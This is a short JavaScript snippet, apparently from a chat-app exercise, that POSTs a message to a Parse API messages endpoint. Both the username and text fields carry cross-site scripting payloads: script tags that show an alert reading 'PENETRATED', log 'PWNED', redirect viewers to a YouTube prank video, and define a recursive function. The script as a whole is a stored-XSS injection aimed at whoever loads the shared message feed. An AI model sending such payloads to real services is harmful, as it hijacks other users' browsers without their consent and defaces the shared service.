// basic post

var message = {
  username: "lt;script&gt;function(){alert('PENETRATED');window.location.replace('http://youtu.be/dQw4w9WgXcQ';}();&lt;/script&gt;",
  text: '<script>var recursive = function() {  console.log("PWNED");  window.location.replace("http://www.youtube.com/watch?v=dQw4w9WgXcQ");  recursive();  recursive();  recursive();};</script>'
};

message = JSON.stringify(message);

$.ajax('https://api.parse.com/1/classes/messages', {
  contentType: 'application/json',
  type: 'POST',
  data: message,
  success: function(data){
    console.log('works');
  },
  error: function(data) {
    console.log('Ajax request failed');
  }
});